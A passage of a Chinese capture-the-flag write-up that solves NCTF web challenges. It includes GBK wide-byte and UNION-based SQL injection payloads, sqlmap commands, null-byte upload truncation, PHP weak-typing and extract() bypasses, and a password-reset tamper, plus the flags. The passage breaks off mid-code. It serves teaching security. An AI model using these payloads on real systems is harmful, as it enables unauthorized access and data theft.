Login=1</code>即可。</p><h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a><a href="http://chinalover.sinaapp.com/web11/" target="_blank" rel="external">MYSQL</a></h4><p><em>nctf{query_in_mysql}</em></p><p>根据提示查看robots.txt，内容如下</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">TIP:sql.php</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_GET[id]) &#123;</div><div class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $id = intval($_GET[id]);</div><div class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</div><div class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span>($query[content]);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>说明要向sql.php提交一个id，使得<code>intval($_GET[id])</code>为1024而<code>$_GET[id]==1024</code>为假。intval识别到非数字的那一位，而松散比较前的强制类型转换会把<code>e</code>当作科学计数法的一部分处理，所以可以提交<code>id=1024e1</code>等，如访问<code>http://chinalover.sinaapp.com/web11/sql.php?id=1024e1</code>。</p><blockquote><p> 1、robots.txt可能藏有提示</p><p> 2、<code>int intval ( mixed $var [, int $base = 10 ] )</code>只取<code>/\d*/</code>的部分。</p></blockquote><h4 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="external">sql injection 3</a></h4><p><em>nctf{gbk_3sqli}</em></p><p>分别访问<code>id=2</code>和<code>id=3</code>得到提示<code>gbk_sql_injection</code>和<code>the fourth table</code>，所以是存在宽字节注入，flag在第四个表里面。上sqlmap跑一跑，最后一步是这样：</p><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">python sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%d6&apos;&quot; -T ctf4 -C flag --dump</div></pre></td></tr></table></figure><p>也可以手注：</p><h5 id="步骤一：确认该点存在注入"><a href="#步骤一：确认该点存在注入" class="headerlink" title="步骤一：确认该点存在注入"></a>步骤一：确认该点存在注入</h5><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">http:<span class="comment">//chinalover.sinaapp.com/SQL-GBK/index.php?id=2  和</span></div><div class="line">http:<span class="comment">//chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27--+ </span></div><div class="line">返回结果相同。</div><div class="line">由于MySQL执行查询时会跳过畸形字符，而 id=<span class="number">2</span>%d6%<span class="number">27</span>--+  经过转义变为id=<span class="number">2</span>%d6%<span class="number">5</span>c%<span class="number">27</span>--+ ，</div><div class="line">其中%d6%<span class="number">5</span>c被合在一起解释，也就是id = <span class="string">'2Ö'</span>-- 效果等价于 id = <span class="string">'2'</span>--，但我们获得了执行sql的机会。</div></pre></td></tr></table></figure><h5 id="步骤二：查询数据库名"><a href="#步骤二：查询数据库名" class="headerlink" title="步骤二：查询数据库名"></a>步骤二：查询数据库名</h5><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">发现支持union查询 ，</div><div class="line">http:<span class="comment">//chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27+and+0+union+select+null,database()--+ </span></div><div class="line">，之所以要加<span class="keyword">and</span>+<span class="number">0</span>+是因为显示点只有一处，必须让原来的查询失败。得到数据库名为<span class="string">'sae-chinalover'</span>。</div></pre></td></tr></table></figure><h5 id="步骤三：查询名为’sae-chinalover’的数据库的表的数量和名字"><a href="#步骤三：查询名为’sae-chinalover’的数据库的表的数量和名字" class="headerlink" title="步骤三：查询名为’sae-chinalover’的数据库的表的数量和名字"></a>步骤三：查询名为’sae-chinalover’的数据库的表的数量和名字</h5><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">http:<span class="comment">//chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,count(*)+from+information_schema.tables+where+table_schema=database()--+</span></div><div class="line">得到目前的数据库含有<span class="number">5</span>张表</div><div class="line">http:<span class="comment">//chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1--+</span></div><div class="line">得到第四张表表名为<span class="string">'ctf4'</span></div><div class="line">MySQL的information_schema数据库包含所有数据库的元信息，其中的tables表包含其他数据库的数据库名、表名、表类型、创建时间等许多信息，其中table_schema列为数据库名，table_name列为表名。因为能显示出来的记录有限，所以必须用limit来控制要显示第几条记录，否则只能显示第一条。</div><div class="line">limit用法是这样LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;，必须放在where后面。</div></pre></td></tr></table></figure><h5 id="步骤四：查询表’ctf4’中的flag"><a href="#步骤四：查询表’ctf4’中的flag" class="headerlink" title="步骤四：查询表’ctf4’中的flag"></a>步骤四：查询表’ctf4’中的flag</h5><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+<span class="keyword">select</span>+<span class="literal">null</span>,<span class="keyword">count</span>(*)+<span class="keyword">from</span>+ctf4<span class="comment">--+</span></div><div class="line">发现该表只有一条记录</div><div class="line"><span class="keyword">http</span>://chinalover.sinaapp.com/<span class="keyword">SQL</span>-GBK/index.php?<span class="keyword">id</span>=<span class="number">2</span>%d6<span class="string">'+and+0+union+select+null,flag+from+ctf4--+</span></div><div class="line"><span class="string">猜测列名为flag，查询得到flag</span></div></pre></td></tr></table></figure><p>附一个<a href="https://dev.mysql.com/doc/refman/5.7/en/select.html" target="_blank" rel="external">select查询语法</a></p><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line"><span class="keyword">SELECT</span></div><div class="line">    [ALL | <span class="keyword">DISTINCT</span> | <span class="keyword">DISTINCTROW</span> ]</div><div class="line">      [<span class="keyword">HIGH_PRIORITY</span>]</div><div class="line">      [<span class="keyword">STRAIGHT_JOIN</span>]</div><div class="line">      [<span class="keyword">SQL_SMALL_RESULT</span>] [<span class="keyword">SQL_BIG_RESULT</span>] [<span class="keyword">SQL_BUFFER_RESULT</span>]</div><div class="line">      [<span class="keyword">SQL_CACHE</span> | SQL_NO_CACHE] [<span class="keyword">SQL_CALC_FOUND_ROWS</span>]</div><div class="line">    select_expr [, select_expr ...]</div><div class="line">    [<span class="keyword">FROM</span> table_references</div><div class="line">      [<span class="keyword">PARTITION</span> partition_list]</div><div class="line">    [<span class="keyword">WHERE</span> where_condition]</div><div class="line">    [<span class="keyword">GROUP</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</div><div class="line">      [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]]</div><div class="line">    [<span class="keyword">HAVING</span> where_condition]</div><div class="line">    [<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</div><div class="line">      [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...]</div><div class="line">    [<span class="keyword">LIMIT</span> &#123;[<span class="keyword">offset</span>,] <span class="keyword">row_count</span> | <span class="keyword">row_count</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span>&#125;]</div><div class="line">    [<span class="keyword">PROCEDURE</span> procedure_name(argument_list)]</div><div class="line">    [<span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'file_name'</span></div><div class="line">        [<span class="built_in">CHARACTER</span> <span class="keyword">SET</span> charset_name]</div><div class="line">        export_options</div><div class="line">      | <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'file_name'</span></div><div class="line">      | <span class="keyword">INTO</span> var_name [, var_name]]</div><div class="line">    [<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> | <span class="keyword">LOCK</span> <span class="keyword">IN</span> <span class="keyword">SHARE</span> <span class="keyword">MODE</span>]]</div></pre></td></tr></table></figure><h4 id="x00"><a href="#x00" class="headerlink" title="/x00"></a><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php" target="_blank" rel="external">/x00</a></h4><p><em>nctf{use00to_jieduan}</em></p><p>访问得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</div><div class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</div><div class="line">            <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </div><div class="line">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure><p>要求提交的nctf的值符合正则匹配(一个或多个数字)并且能被strpos找到<code>#biubiubiu</code> ，根据提示查到资料ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00，所以提交<code>nctf=1%00%23biubiubiu</code>即可。</p><p><a href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/boston-key-party/bringham-circle.md" target="_blank" rel="external">参考资料</a></p><p>由于在PHP中<a href="http://php.net/manual/en/language.types.string.php#language.types.string.details" target="_blank" rel="external">string</a>的实现本质上是一个以字节为单位的数组加上一个声明缓冲区长度的整形，因此string类型可以由任何值构成，即使是“NUL bytes”，但PHP中有些底层库（比如C语言相关的，因为C语言中\0标识字符串的结束）会忽略”a NUL byte”后面的数据，使用了这些库的函数就是非二进制安全的(non-binary-safe)，ereg就是一个例子。闲着无聊<a href="https://www.google.com/search?q=%22not+binary+safe%22+or+%22not+binary-safe%22+site%3Aphp.net%2Fmanual%2Fen%2F" target="_blank" rel="external">搜</a>了一下发现还有这么一些函数：</p><ul><li>int strcoll ( string $str1 , string $str2 )<br>Locale based string comparison  (when current locale is not C or POSIX)</li><li>public array TokyoTyrantTable::get ( mixed $keys )<br>Gets a row from table database. (version&gt;0.3.0)</li><li>public Exception::__construct ([ string $message = “” [, int $code = 0 [, Throwable $previous = NULL ]]] )<br>Construct the exception 。其中对message的处理是非二进制安全的。</li><li>public Error::__construct ([ string $message = “” [, int $code = 0 [, Throwable $previous = NULL ]]] )<br>Construct the error object 。其中对message的处理是非二进制安全的。</li><li>bool error_log ( string $message [, int $message_type = 0 [, string $destination [, string $extra_headers ]]] )<br>Sends an error message to the web server’s error log or to a file.。其中对message的处理是非二进制安全的。(error_log() is not binary safe. message will be truncated by null character.)</li><li>bool radius_put_string ( resource $radius_handle , int $type , string $value [, int $options = 0 [, int $tag ]] )<br>Attaches a string attribute。 其中$value值基于会被null截断的底层库，是非二进制安全的。</li><li>bool radius_put_vendor_string ( resource $radius_handle , int $vendor , int $type , string $value [, int $options = 0 [, int $tag ]] )<br>Attaches a vendor specific string attribute 。$value是非二进制安全的。</li><li>string addcslashes ( string $str , string $charlist )   （存疑，似乎并不是）<br>Quote string with slashes in a C style. Returns a string with backslashes before characters that are listed in charlist parameter.  </li><li>array gzfile ( string $filename [, int $use_include_path = 0 ] ) （存疑，待验证）<br>Read entire gz-file into an array </li><li>还有这些</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$s=$_REQUEST[<span class="string">'a'</span>]; <span class="comment">//   http://localhost/test.php?a=asd%00asdf</span></div><div class="line">$p=<span class="string">'asdf'</span>;</div><div class="line">var_dump(ereg_replace($p,<span class="string">'abcc'</span>,$s)); <span class="comment">//string(3) "asd" </span></div><div class="line">var_dump(eregi_replace($p,<span class="string">'abcc'</span>,$s));<span class="comment">//string(3) "asd" </span></div><div class="line">var_dump(ereg($p,$s));<span class="comment">//bool(false) </span></div><div class="line">var_dump(eregi($p,$s));<span class="comment">//bool(false) </span></div><div class="line">var_dump(split($p,$s));<span class="comment">//array(1) &#123; [0]=&gt; string(8) "asd\0asdf" &#125; </span></div><div class="line">var_dump(split($p,$s));<span class="comment">//array(1) &#123; [0]=&gt; string(8) "asd\0asdf" &#125; </span></div><div class="line">var_dump(sql_regcase($s)); <span class="comment">//看起来没问题啊。。。string(29) "[Aa][Ss][Dd]\0[Aa][Ss][Dd][Ff]" </span></div><div class="line"><span class="comment">// ereg_replace — Replace regular expression</span></div><div class="line"><span class="comment">// ereg — Regular expression match</span></div><div class="line"><span class="comment">// eregi_replace — Replace regular expression case insensitive</span></div><div class="line"><span class="comment">// eregi — Case insensitive regular expression match</span></div><div class="line"><span class="comment">// split — Split string into array by regular expression</span></div><div class="line"><span class="comment">// spliti — Split string into array by regular expression case insensitive</span></div><div class="line"><span class="comment">// sql_regcase — Make regular expression for case insensitive match</span></div></pre></td></tr></table></figure><h4 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a><a href="http://chinalover.sinaapp.com/web17/index.php" target="_blank" rel="external">bypass again</a></h4><p><em>nctf{php_is_so_cool}</em></p><p>访问得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</div><div class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</div><div class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) === md5($_GET[<span class="string">'b'</span>]))</div><div class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>源码要求提交两个不相等的值使他们的md5值严格相等。md5()函数要求接收一个字符串，若传递进去一个数组，则会返回null，即<code>var_dump(md5(array(2))===null);</code>值为<code>bool(true)</code> ，因此向$_GET数组传入两个名为a、b的不相等的数组，从而导致md5()均返回空，于是得到flag，如访问 <em><a href="http://chinalover.sinaapp.com/web17/index.php?a[]=&amp;b[]=1" target="_blank" rel="external">http://chinalover.sinaapp.com/web17/index.php?a[]=&amp;b[]=1</a></em> </p><h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a><a href="http://chinalover.sinaapp.com/web18/index.php" target="_blank" rel="external">变量覆盖</a></h4><p><em>nctf{bian_liang_fu_gai!}</em></p><p>source.php核心代码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">  <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123;</div><div class="line">                        extract($_POST);</div><div class="line">                        <span class="keyword">if</span> ($pass == $thepassword_123)</div><div class="line">                          <span class="keyword">echo</span> $theflag;</div><div class="line">  &#125;</div></pre></td></tr></table></figure><p>extract()函数原型为<code>int extract(array &amp;$var_array [,int $extract_type=EXTR_OVERWRITE [,string $prefix = NULL]])</code> ，从数组中将变量导入当前符号表，<code>$extract_type</code>缺省值为1，若没有另外指定，函数将覆盖已有变量，故传入任意pass和与之相等的thepassword_123即可。其实我们甚至可以覆盖theflag变量，但是那样就拿不到真正的flag了 :D。source.php包含源码。</p><h4 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a><a href="http://way.nuptzj.cn/php/index.php" target="_blank" rel="external">PHP是世界上最好的语言</a></h4><p><em>nctf{php_is_best_language}</em></p><p>index.txt核心代码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</div><div class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</div><div class="line">  <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line">$_GET[id] = urldecode($_GET[id]);</div><div class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>网页会拒绝任何含有<code>hackerDJ</code>的提交(忽略大小写)，但接受urldecode后为<code>hackerDJ</code>的字符串，所以按照<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="external">对照表</a>编码，并将<code>%</code>编码为<code>%25</code>后提交，自动解码一次后<code>%25</code>变为<code>%</code>,代码中再解码一次后便得到flag。即访问 <em><a href="http://way.nuptzj.cn/php/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a" target="_blank" rel="external">http://way.nuptzj.cn/php/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a</a></em>  这是个二次编码的问题。</p><h4 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h4><blockquote><p>这是一个到处都有着伪装的世界<br>题目地址：<a href="http://chinalover.sinaapp.com/web4/xxx.php" target="_blank" rel="external">点我</a></p></blockquote><p> <em>nctf{happy_http_headers}</em> </p><p>referer改了没用，据说请求头添加<code>X-Forwarded-For: 127.0.0.1</code>即可，没有成功，怀疑服务端代码有问题，可能是和<code>你从哪里来</code>那题一样的问题。XFF头用以标志客户端真实IP，常用在使用HTTP 代理或者负载均衡服务时。</p><h4 id="header"><a href="#header" class="headerlink" title="header"></a><a href="http://way.nuptzj.cn/web5/" target="_blank" rel="external">header</a></h4><p><em>nctf{tips_often_hide_here}</em></p><p>使用chrome浏览器的开发者工具可以看到相应数据包的头部有flag字段，其值即flag。</p><h4 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h4><blockquote><p>题目地址：<a href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html" target="_blank" rel="external">猜猜代码怎么写的</a></p></blockquote><p><em>nctf{welcome_to_hacks_world}</em></p><p>当filename为1.jpg时返回如下:</p><figure class="highlight html"><table><tr><td class="code"><pre><div class="line">Array</div><div class="line">(</div><div class="line">    [0] =&gt; .jpg</div><div class="line">    [1] =&gt; jpg</div><div class="line">)</div><div class="line">Upload: 1.jpg<span class="tag">&lt;<span class="name">br</span> /&gt;</span>Type: text/plain<span class="tag">&lt;<span class="name">br</span> /&gt;</span>Size: 0.0078125 Kb<span class="tag">&lt;<span class="name">br</span> /&gt;</span>Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) &#123;</div><div class="line">  ["dirname"]=&gt;</div><div class="line">  string(9) "./uploads"</div><div class="line">  ["basename"]=&gt;</div><div class="line">  string(5) "1.jpg"</div><div class="line">  ["extension"]=&gt;</div><div class="line">  string(3) "jpg"</div><div class="line">  ["filename"]=&gt;</div><div class="line">  string(1) "1"</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>必须上传成后缀名为php的文件才行啊！<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure><p>当filename为1.php时返回如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><div class="line">Array</div><div class="line">(</div><div class="line">    [0] =&gt; .php</div><div class="line">    [1] =&gt; php</div><div class="line">)</div><div class="line">不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件</div></pre></td></tr></table></figure><p>观察源码为：</p><figure class="highlight html"><table><tr><td class="code"><pre><div class="line">文件上传<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span></span></div><div class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"dir"</span> <span class="attr">value</span>=<span class="string">"/uploads/"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> </div><div class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure><p>因为最后应该是dir和file连接，所以可以通过修改隐藏元素dir的value来实现截断上传。即抓包后修改</p><p><code>/uploads/</code>为<code>/uploads/1.php0x00</code>，然后file保持<code>1.jpg</code>，连起来后就是<code>/uploads/1.php%001.jpg</code>，则既绕过了白名单验证又上传了PHP后缀的文件。（0x00是指修改16进制值，不可见。）</p><h4 id="sql注入1"><a href="#sql注入1" class="headerlink" title="sql注入1"></a>sql注入1</h4><blockquote><p>听说你也会注入？<br>地址： <a href="http://chinalover.sinaapp.com/index.php" target="_blank" rel="external">题目地址</a></p></blockquote><p><em>nctf{ni_ye_hui_sql?}</em></p><p>在 <em><a href="http://chinalover.sinaapp.com/index.phps" target="_blank" rel="external">http://chinalover.sinaapp.com/index.phps</a></em>  查看源码，核心部分如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $user = trim($_POST[user]);</div><div class="line">  $pass = md5(trim($_POST[pass]));</div><div class="line">  $sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</div><div class="line">  $query = mysql_fetch_array(mysql_query($sql));</div><div class="line">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span>($query[user] != <span class="string">"admin"</span>) &#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> $query[user];</div></pre></td></tr></table></figure><p>会对传入参数两端去空格，然后sql拼接如下</p><p><code>$sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;;</code> ，</p><p>所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。MySQL主要有三种注释方式<code>#</code>注释到行尾，<code>/*bla*/</code>用于行间或多行注释，<code>--</code>也是注释到行尾，但需要注意的是在两个减号后面至少要有一个<code>\s</code>，也就是空格，TAB，换行符等。</p><p>所以本题可post <code>user=admin&#39;)-- -&amp;pass=123</code>或<code>user=admin&#39;)#&amp;pass=123</code>，</p><p>sql语句就变成<code>select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;)</code>,</p><p>查询语句就能成功返回user列，值为admin的那条记录。</p><h4 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a><a href="http://chinalover.sinaapp.com/web21/" target="_blank" rel="external">pass check</a></h4><p><em>nctf{strcmp_is_n0t_3afe}</em></p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$pass=@$_POST[<span class="string">'pass'</span>];</div><div class="line">$pass1=***********;<span class="comment">//被隐藏起来的密码</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($pass))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(@!strcmp($pass,$pass1))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"flag:nctf&#123;*&#125;"</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"the pass is wrong!"</span>;</div><div class="line">&#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"please input pass!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>考察PHP弱类型，从PHP社区文档的注解可以发现strcmp函数在比较失败，即传入数组，时会返回null。(还有一个比较有意思的是当有一个字符串长度为0时，返回的是相互比较的两个字符串长度的差值。)所以post的数据为<code>pass[]=</code></p><h4 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h4><p><em>nctf{follow_your_dream}</em></p><blockquote><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">&gt; <span class="meta">&lt;?php</span></div><div class="line">&gt;  <span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></div><div class="line"><span class="function">&gt; </span>&#123;</div><div class="line">&gt;         $one = ord(<span class="string">'1'</span>);</div><div class="line">&gt;         $nine = ord(<span class="string">'9'</span>);</div><div class="line">&gt;         <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</div><div class="line">&gt;         &#123;   </div><div class="line">&gt;                 $digit = ord($number&#123;$i&#125;);</div><div class="line">&gt;                 <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</div><div class="line">&gt;                 &#123;</div><div class="line">&gt;                         <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&gt;                 &#125;</div><div class="line">&gt;         &#125;</div><div class="line">&gt;            <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>;</div><div class="line">&gt; &#125;</div><div class="line">&gt; $flag=<span class="string">'*******'</span>;</div><div class="line">&gt; <span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">'key'</span>]))</div><div class="line">&gt;     <span class="keyword">echo</span> $flag;</div><div class="line">&gt; <span class="keyword">else</span> </div><div class="line">&gt;     <span class="keyword">echo</span> <span class="string">'access denied'</span>;</div><div class="line">&gt; <span class="meta">?&gt;</span></div><div class="line">&gt;</div></pre></td></tr></table></figure></blockquote><p>要求传入key不包含[1-9]，但又等于54975581388，考虑转十六进制，发现<code>54975581388=0xccccccccc</code>，</p><p>因此访问 <em><a href="http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc" target="_blank" rel="external">http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc</a></em> </p><h4 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h4><blockquote><p>重置管理员账号：admin 的密码</p><p>你在点击忘记密码之后 你的邮箱收到了这么一封重置密码的邮件：</p><p>点击<a href="http://nctf.nuptzj.cn/web13/index.php?user1=%59%33%52%6D%64%58%4E%6C%63%67%3D%3D" target="_blank" rel="external">此链接</a>重置您的密码</p></blockquote><p><em>nctf{reset_password_often_have_vuln</em></p><p>修改重置链接的URL和POST中对应参数为admin相关的即可。</p><p>即向 <em><a href="http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4%3D" target="_blank" rel="external">http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4%3D</a></em>  post <em>user=admin&amp;newpass=aaaaa&amp;vcode=1234</em>  。</p><h4 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a><a href="http://115.28.150.176/php1/index.php" target="_blank" rel="external">php反序列化</a></h4><blockquote><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">&gt; <span class="meta">&lt;?php</span></div><div class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</div><div class="line">&gt;     <span class="keyword">var</span> $enter;</div><div class="line">&gt;     <span class="keyword">var</span> $secret;</div><div class="line">&gt; &#125;</div><div class="line">&gt; <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</div><div class="line">&gt;     $pass = $_GET[<span class="string">'pass'</span>];</div><div class="line">&gt;     <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</div><div class="line">&gt;         $pass=stripslashes($pass);</div><div 